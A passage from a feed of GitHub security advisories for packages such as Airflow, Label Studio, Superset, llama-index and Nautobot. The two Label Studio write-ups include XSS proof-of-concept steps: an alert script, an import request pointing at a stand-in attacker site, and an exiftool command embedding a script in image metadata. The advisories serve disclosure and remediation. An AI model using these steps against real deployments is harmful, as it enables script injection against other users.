<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52289">https://nvd.nist.gov/vuln/detail/CVE-2023-52289</a></li>
<li><a href="https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md">https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md</a></li>
<li><a href="https://github.com/advisories/GHSA-v3rg-qm46-xrg9">https://github.com/advisories/GHSA-v3rg-qm46-xrg9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v3rg-qm46-xrg9</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-13T06:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[flaskcode] Path traversal in flaskcode]]></title>
        <id>https://github.com/advisories/GHSA-6h4q-63c5-qfqf</id>
        <link href="https://github.com/advisories/GHSA-6h4q-63c5-qfqf"/>
        <updated>2024-01-24T21:53:28.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in the flaskcode package through 0.0.8 for Python. An unauthenticated directory traversal, exploitable with a GET request to a /resource-data/.txt URI (from views.py), allows attackers to read arbitrary files.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-52288">https://nvd.nist.gov/vuln/detail/CVE-2023-52288</a></li>
<li><a href="https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md">https://gitlab.com/daniele_m/cve-list/-/blob/main/README.md</a></li>
<li><a href="https://github.com/advisories/GHSA-6h4q-63c5-qfqf">https://github.com/advisories/GHSA-6h4q-63c5-qfqf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6h4q-63c5-qfqf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-13T06:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-cncf-kubernetes] Apache Airflow CNCF Kubernetes provider, Apache Airflow: Kubernetes configuration file saved without encryption in the Metadata and logged as plain text in the Triggerer service]]></title>
        <id>https://github.com/advisories/GHSA-mg2x-mggj-6955</id>
        <link href="https://github.com/advisories/GHSA-mg2x-mggj-6955"/>
        <updated>2024-01-24T21:13:06.000Z</updated>
        <content type="html"><![CDATA[<p>Since version 5.2.0, when using deferrable mode with the path of a Kubernetes configuration file for authentication, the Airflow worker serializes this configuration file as a dictionary and sends it to the triggerer by storing it in metadata without any encryption. Additionally, if used with an Airflow version between 2.3.0 and 2.6.0, the configuration dictionary will be logged as plain text in the triggerer service without masking. This allows anyone with access to the metadata or triggerer log to obtain the configuration file and use it to access the Kubernetes cluster.</p>
<p>This behavior was changed in version 7.0.0, which stopped serializing the file contents and started providing the file path instead to read the contents into the trigger. Users are recommended to upgrade to version 7.0.0, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51702">https://nvd.nist.gov/vuln/detail/CVE-2023-51702</a></li>
<li><a href="https://github.com/apache/airflow/pull/29498">https://github.com/apache/airflow/pull/29498</a></li>
<li><a href="https://github.com/apache/airflow/pull/30110">https://github.com/apache/airflow/pull/30110</a></li>
<li><a href="https://github.com/apache/airflow/pull/36492">https://github.com/apache/airflow/pull/36492</a></li>
<li><a href="https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9">https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/24/3">http://www.openwall.com/lists/oss-security/2024/01/24/3</a></li>
<li><a href="https://github.com/advisories/GHSA-mg2x-mggj-6955">https://github.com/advisories/GHSA-mg2x-mggj-6955</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg2x-mggj-6955</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-24T15:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow CNCF Kubernetes provider, Apache Airflow: Kubernetes configuration file saved without encryption in the Metadata and logged as plain text in the Triggerer service]]></title>
        <id>https://github.com/advisories/GHSA-mg2x-mggj-6955</id>
        <link href="https://github.com/advisories/GHSA-mg2x-mggj-6955"/>
        <updated>2024-01-24T21:13:06.000Z</updated>
        <content type="html"><![CDATA[<p>Since version 5.2.0, when using deferrable mode with the path of a Kubernetes configuration file for authentication, the Airflow worker serializes this configuration file as a dictionary and sends it to the triggerer by storing it in metadata without any encryption. Additionally, if used with an Airflow version between 2.3.0 and 2.6.0, the configuration dictionary will be logged as plain text in the triggerer service without masking. This allows anyone with access to the metadata or triggerer log to obtain the configuration file and use it to access the Kubernetes cluster.</p>
<p>This behavior was changed in version 7.0.0, which stopped serializing the file contents and started providing the file path instead to read the contents into the trigger. Users are recommended to upgrade to version 7.0.0, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-51702">https://nvd.nist.gov/vuln/detail/CVE-2023-51702</a></li>
<li><a href="https://github.com/apache/airflow/pull/29498">https://github.com/apache/airflow/pull/29498</a></li>
<li><a href="https://github.com/apache/airflow/pull/30110">https://github.com/apache/airflow/pull/30110</a></li>
<li><a href="https://github.com/apache/airflow/pull/36492">https://github.com/apache/airflow/pull/36492</a></li>
<li><a href="https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9">https://lists.apache.org/thread/89x3q6lz5pykrkr1fkr04k4rfn9pvnv9</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/24/3">http://www.openwall.com/lists/oss-security/2024/01/24/3</a></li>
<li><a href="https://github.com/advisories/GHSA-mg2x-mggj-6955">https://github.com/advisories/GHSA-mg2x-mggj-6955</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mg2x-mggj-6955</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-01-24T15:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: Bypass permission verification to read code of other dags]]></title>
        <id>https://github.com/advisories/GHSA-vm5m-qmrx-fw8w</id>
        <link href="https://github.com/advisories/GHSA-vm5m-qmrx-fw8w"/>
        <updated>2024-01-24T21:01:06.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.8.1, have a vulnerability that allows an authenticated user to access the source code of a DAG to which they don't have access.&nbsp;This vulnerability is considered low since it requires an authenticated user to exploit it. Users are recommended to upgrade to version 2.8.1, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50944">https://nvd.nist.gov/vuln/detail/CVE-2023-50944</a></li>
<li><a href="https://github.com/apache/airflow/pull/36257">https://github.com/apache/airflow/pull/36257</a></li>
<li><a href="https://lists.apache.org/thread/92krb5mpcq8qrw4t4j5oooqw7hgd8q7h">https://lists.apache.org/thread/92krb5mpcq8qrw4t4j5oooqw7hgd8q7h</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/24/5">http://www.openwall.com/lists/oss-security/2024/01/24/5</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-14.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-14.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-vm5m-qmrx-fw8w">https://github.com/advisories/GHSA-vm5m-qmrx-fw8w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vm5m-qmrx-fw8w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-24T15:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow] Apache Airflow: pickle deserialization vulnerability in XComs]]></title>
        <id>https://github.com/advisories/GHSA-c3c6-f2ww-xfr2</id>
        <link href="https://github.com/advisories/GHSA-c3c6-f2ww-xfr2"/>
        <updated>2024-01-24T20:55:31.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Airflow, versions before 2.8.1, have a vulnerability that allows a potential attacker to poison the XCom data by bypassing the protection of "enable_xcom_pickling=False" configuration setting resulting in poisoned data after XCom deserialization. This vulnerability is considered low since it requires a DAG author to exploit it. Users are recommended to upgrade to version 2.8.1 or later, which fixes this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-50943">https://nvd.nist.gov/vuln/detail/CVE-2023-50943</a></li>
<li><a href="https://github.com/apache/airflow/pull/36255">https://github.com/apache/airflow/pull/36255</a></li>
<li><a href="https://lists.apache.org/thread/fx278v0twqzxkcts70tc04cp3f8p56pn">https://lists.apache.org/thread/fx278v0twqzxkcts70tc04cp3f8p56pn</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/24/4">http://www.openwall.com/lists/oss-security/2024/01/24/4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-13.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-airflow/PYSEC-2024-13.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-c3c6-f2ww-xfr2">https://github.com/advisories/GHSA-c3c6-f2ww-xfr2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3c6-f2ww-xfr2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-24T15:30:30.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Cross-site Scripting Vulnerability on Data Import]]></title>
        <id>https://github.com/advisories/GHSA-fq23-g58m-799r</id>
        <link href="https://github.com/advisories/GHSA-fq23-g58m-799r"/>
        <updated>2024-01-24T14:21:49.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.10.1</code> and was tested on version <code>1.9.2.post0</code>.</p>
<h1 id="overview">Overview</h1>
<p><a href="https://github.com/HumanSignal/label-studio">Label Studio</a> had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.</p>
<h1 id="description">Description</h1>
<p>The following <a href="https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146">code snippet in Label Studio</a> showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.</p>
<pre><code class="language-python">def tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):
    """Download file using URL and read tasks from it"""
    # process URL with tasks
    try:
        filename = url.rsplit('/', 1)[-1] &lt;1&gt;

        response = ssrf_safe_get(
            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}
        )
        file_content = response.content
        check_tasks_max_file_size(int(response.headers['content-length']))
        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))
        if file_upload.format_could_be_tasks_list:
            could_be_tasks_list = True
        file_upload_ids.append(file_upload.id)
        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)

    except ValidationError as e:
        raise e
    except Exception as e:
        raise ValidationError(str(e))
    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list
</code></pre>
<ol>
<li>The file name that was set was retrieved from the URL.</li>
</ol>
<p>The downloaded file path could then be retrieved by sending a request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code> where <code>{project_id}</code> was the ID of the project and <code>{download_id}</code> was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the <a href="https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62">following code snippet</a> demonstrated that the <code>Content-Type</code> of the response was determined by the file extension, since <code>mimetypes.guess_type</code> guesses the <code>Content-Type</code> based on the file extension.</p>
<pre><code class="language-python">class UploadedFileResponse(generics.RetrieveAPIView):
    permission_classes = (IsAuthenticated,)

    @swagger_auto_schema(auto_schema=None)
    def get(self, *args, **kwargs):
        request = self.request
        filename = kwargs['filename']
        # XXX needed, on windows os.path.join generates '\' which breaks FileUpload
        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename
        logger.debug(f'Fetch uploaded file by user {request.user} =&gt; {file}')
        file_upload = FileUpload.objects.filter(file=file).last()

        if not file_upload.has_permission(request.user):
            return Response(status=status.HTTP_403_FORBIDDEN)

        file = file_upload.file
        if file.storage.exists(file.name):
            content_type, encoding = mimetypes.guess_type(str(file.name)) &lt;1&gt;
            content_type = content_type or 'application/octet-stream'
            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)
        else:
            return Response(status=status.HTTP_404_NOT_FOUND)
</code></pre>
<ol>
<li>Determines the <code>Content-Type</code> based on the extension of the uploaded file by using <code>mimetypes.guess_type</code>.</li>
</ol>
<p>Since the <code>Content-Type</code> was determined by the file extension of the downloaded file, an attacker could import in a <code>.html</code> file that would execute JavaScript when visited.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below were the steps to recreate this issue:</p>
<ol>
<li>Host the following HTML proof of concept (POC) script on an external website with the file extension <code>.html</code> that would be downloaded to the Label Studio website.</li>
</ol>
<pre><code class="language-html">&lt;html&gt;
    &lt;body&gt;
        &lt;h1&gt;Data Import XSS&lt;/h1&gt;
        &lt;script&gt;
            alert(document.domain);
        &lt;/script&gt;
    &lt;/body&gt;
&lt;/html&gt;
</code></pre>
<ol start="2">
<li>Send the following <code>POST</code> request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the <code>{victim_host}</code> is the address and port of the victim Label Studio website (eg. <code>labelstudio.com:8080</code>), <code>{project_id}</code> is the ID of the project where the data would be imported into, <code>{cookies}</code> are session cookies and <code>{evil_site}</code> is the website hosting the malicious HTML file (named <code>xss.html</code> in the following example).</li>
</ol>
<pre><code class="language-http">POST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1
Host: {victim_host}
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 43
Connection: close
Cookie: {cookies}
Pragma: no-cache
Cache-Control: no-cache

url=https://{evil_site}/xss.html
</code></pre>
<ol start="3">
<li><p>To retrieve the downloaded file path could be retrieved by sending a <code>GET</code> request to <code>/api/projects/{project_id}/file-uploads?ids=[{download_id}]</code>, where <code>{download_id}</code> is the ID of the file download from the previous step.</p>
</li>
<li><p>Send your victim a link to <code>/data/{file_path}</code>, where <code>{file_path}</code> is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting <code>/data/upload/1/cfcfc340-xss.html</code>.</p>
</li>
</ol>
<p><img alt="xss-import-alert" src="https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png"></p>
<h1 id="impact">Impact</h1>
<p>Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<ul>
<li>For all user provided files that are downloaded by Label Studio, set the <code>Content-Security-Policy: sandbox;</code> response header when viewed on the site. The <code>sandbox</code> directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a <code>same-origin</code> policy (<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">documentation</a>).</li>
<li>Restrict the allowed file extensions that could be downloaded.</li>
</ul>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-fq23-g58m-799r</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23633">https://nvd.nist.gov/vuln/detail/CVE-2024-23633</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146">https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146</a></li>
<li><a href="https://github.com/advisories/GHSA-fq23-g58m-799r">https://github.com/advisories/GHSA-fq23-g58m-799r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fq23-g58m-799r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-24T14:21:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[label-studio] Cross-site Scripting Vulnerability on Avatar Upload]]></title>
        <id>https://github.com/advisories/GHSA-q68h-xwq5-mm7x</id>
        <link href="https://github.com/advisories/GHSA-q68h-xwq5-mm7x"/>
        <updated>2024-01-24T14:21:29.000Z</updated>
        <content type="html"><![CDATA[<h1 id="introduction">Introduction</h1>
<p>This write-up describes a vulnerability found in <a href="https://github.com/HumanSignal/label-studio">Label Studio</a>, a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to <code>1.9.2</code> and was tested on version <code>1.8.2</code>.</p>
<h1 id="overview">Overview</h1>
<p><a href="https://github.com/HumanSignal/label-studio">Label Studio</a> has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.</p>
<h1 id="description">Description</h1>
<p>The following <a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49">code snippet in Label Studio</a> shows that the only verification check is that the file is an image by extracting the dimensions from the file.</p>
<pre><code class="language-python">
def hash_upload(instance, filename):
    filename = str(uuid.uuid4())[0:8] + '-' + filename
    return settings.AVATAR_PATH + '/' + filename &lt;3&gt;


def check_avatar(files):
    images = list(files.items())
    if not images:
        return None

    filename, avatar = list(files.items())[0]  # get first file
    w, h = get_image_dimensions(avatar) &lt;1&gt;
    if not w or not h:
        raise forms.ValidationError("Can't read image, try another one")

    # validate dimensions
    max_width = max_height = 1200
    if w &gt; max_width or h &gt; max_height:
        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'
                                    % (max_width, max_height))

    # validate content type
    main, sub = avatar.content_type.split('/') &lt;2&gt;
    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):
        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')

    # validate file size
    max_size = 1024 * 1024
    if len(avatar) &gt; max_size:
        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')

    return avatar
</code></pre>
<ol>
<li>Attempts to get image dimensions to validate the uploaded avatar file is an image.</li>
<li>Extracts the <code>Content-Type</code> from the upload <code>POST</code> request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. <code>image/jpeg</code>).</li>
<li>The file extension of the uploaded file is never validated and is saved to the filesystem.</li>
</ol>
<p><a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26">Label Studio serves avatar images using Django's built-in <code>serve</code> view</a>, which is <a href="https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development">not secure for production use according to Django's documentation</a>.</p>
<pre><code class="language-python">    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P&lt;path&gt;.*)$', serve,
            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),
</code></pre>
<p>The issue with the Django <code>serve</code> view is that it determines the <code>Content-Type</code> of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a <code>.html</code> extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.</p>
<h1 id="proof-of-concept">Proof of Concept</h1>
<p>Below are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.</p>
<ol>
<li>Using any JPEG or PNG image, add in the comment field in the metadata the HTML code <code>&lt;script&gt;alert(document.domain)&lt;/script&gt;</code>. This can be done using the <code>exiftool</code> command as shown below that was used to create the following image.</li>
</ol>
<pre><code class="language-bash">exiftool -Comment='&lt;script&gt;alert(document.domain)&lt;/script&gt;' penguin.jpg
</code></pre>
<p><img alt="xss-penguin" src="https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg"></p>
<ol start="2">
<li><p>On Label Studio, navigate to account &amp; settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a <code>.html</code> extension.</p>
</li>
<li><p>Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.</p>
</li>
</ol>
<p><img alt="xss-alert" src="https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png"></p>
<h1 id="impact">Impact</h1>
<p>Executing arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.</p>
<h1 id="remediation-advice">Remediation Advice</h1>
<ul>
<li>Validate the file extension on the server side, not in client-side code.</li>
<li>Remove the use of Django's <code>serve</code> view and implement a secure controller for viewing uploaded avatar images.</li>
<li>Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.</li>
<li>Avoid trusting user controlled inputs.</li>
</ul>
<h1 id="discovered">Discovered</h1>
<ul>
<li>August 2023, Alex Brown, elttam</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/HumanSignal/label-studio/security/advisories/GHSA-q68h-xwq5-mm7x">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-q68h-xwq5-mm7x</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-47115">https://nvd.nist.gov/vuln/detail/CVE-2023-47115</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/commit/a7a71e594f32ec4af8f3f800d5ccb8662e275da3">https://github.com/HumanSignal/label-studio/commit/a7a71e594f32ec4af8f3f800d5ccb8662e275da3</a></li>
<li><a href="https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development">https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49</a></li>
<li><a href="https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26">https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26</a></li>
<li><a href="https://github.com/advisories/GHSA-q68h-xwq5-mm7x">https://github.com/advisories/GHSA-q68h-xwq5-mm7x</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q68h-xwq5-mm7x</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-24T14:21:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-superset] Cross-site Scripting in Apache superset]]></title>
        <id>https://github.com/advisories/GHSA-rwhh-6x83-84v6</id>
        <link href="https://github.com/advisories/GHSA-rwhh-6x83-84v6"/>
        <updated>2024-01-23T21:35:09.000Z</updated>
        <content type="html"><![CDATA[<p>A stored cross-site scripting (XSS) vulnerability exists in Apache Superset before 3.0.3.&nbsp;An authenticated attacker with create/update permissions on charts or dashboards could store a script or add a specific HTML snippet that would act as a stored XSS.</p>
<p>For 2.X versions, users should change their config to include:</p>
<p>TALISMAN_CONFIG = {
&nbsp; &nbsp; "content_security_policy": {
&nbsp; &nbsp; &nbsp; &nbsp; "base-uri": ["'self'"],
&nbsp; &nbsp; &nbsp; &nbsp; "default-src": ["'self'"],
&nbsp; &nbsp; &nbsp; &nbsp; "img-src": ["'self'", "blob:", "data:"],
&nbsp; &nbsp; &nbsp; &nbsp; "worker-src": ["'self'", "blob:"],
&nbsp; &nbsp; &nbsp; &nbsp; "connect-src": [
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "'self'",
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; " <a href="https://api.mapbox.com">https://api.mapbox.com</a>" <a href="https://api.mapbox.com">https://api.mapbox.com</a>" ;,
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; " <a href="https://events.mapbox.com">https://events.mapbox.com</a>" <a href="https://events.mapbox.com">https://events.mapbox.com</a>" ;,
&nbsp; &nbsp; &nbsp; &nbsp; ],
&nbsp; &nbsp; &nbsp; &nbsp; "object-src": "'none'",
&nbsp; &nbsp; &nbsp; &nbsp; "style-src": [
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "'self'",
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "'unsafe-inline'",
&nbsp; &nbsp; &nbsp; &nbsp; ],
&nbsp; &nbsp; &nbsp; &nbsp; "script-src": ["'self'", "'strict-dynamic'"],
&nbsp; &nbsp; },
&nbsp; &nbsp; "content_security_policy_nonce_in": ["script-src"],
&nbsp; &nbsp; "force_https": False,
&nbsp; &nbsp; "session_cookie_secure": False,
}</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-49657">https://nvd.nist.gov/vuln/detail/CVE-2023-49657</a></li>
<li><a href="https://lists.apache.org/thread/wjyvz8om9nwd396lh0bt156mtwjxpsvx">https://lists.apache.org/thread/wjyvz8om9nwd396lh0bt156mtwjxpsvx</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2024/01/23/5">http://www.openwall.com/lists/oss-security/2024/01/23/5</a></li>
<li><a href="https://github.com/advisories/GHSA-rwhh-6x83-84v6">https://github.com/advisories/GHSA-rwhh-6x83-84v6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rwhh-6x83-84v6</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-01-23T15:30:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[llama-index] SQL injection in llama-index]]></title>
        <id>https://github.com/advisories/GHSA-2jxw-4hm4-6w87</id>
        <link href="https://github.com/advisories/GHSA-2jxw-4hm4-6w87"/>
        <updated>2024-01-23T20:10:03.000Z</updated>
        <content type="html"><![CDATA[<p>LlamaIndex (aka llama_index) through 0.9.35 allows SQL injection via the Text-to-SQL feature in NLSQLTableQueryEngine, SQLTableRetrieverQueryEngine, NLSQLRetriever, RetrieverQueryEngine, and PGVectorSQLQueryEngine. For example, an attacker might be able to delete this year's student records via "Drop the Students table" within English language input.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-23751">https://nvd.nist.gov/vuln/detail/CVE-2024-23751</a></li>
<li><a href="https://github.com/run-llama/llama_index/issues/9957">https://github.com/run-llama/llama_index/issues/9957</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/llama-index/PYSEC-2024-12.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/llama-index/PYSEC-2024-12.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-2jxw-4hm4-6w87">https://github.com/advisories/GHSA-2jxw-4hm4-6w87</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2jxw-4hm4-6w87</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-01-22T03:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] XSS potential in rendered Markdown fields (comments, description, notes, etc.)]]></title>
        <id>https://github.com/advisories/GHSA-v4xv-795h-rv4h</id>
        <link href="https://github.com/advisories/GHSA-v4xv-795h-rv4h"/>
        <updated>2024-01-23T14:44:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All users of Nautobot versions earlier than 1.6.10 or 2.1.2 are potentially impacted.</p>
<p>Due to inadequate input sanitization, any user-editable fields that support Markdown rendering, including:</p>
<ul>
<li><code>Circuit.comments</code></li>
<li><code>Cluster.comments</code></li>
<li><code>CustomField.description</code></li>
<li><code>Device.comments</code></li>
<li><code>DeviceRedundancyGroup.comments</code></li>
<li><code>DeviceType.comments</code></li>
<li><code>Job.description</code></li>
<li><code>JobLogEntry.message</code></li>
<li><code>Location.comments</code></li>
<li><code>Note.note</code></li>
<li><code>PowerFeed.comments</code></li>
<li><code>Provider.noc_contact</code></li>
<li><code>Provider.admin_contact</code></li>
<li><code>Provider.comments</code></li>
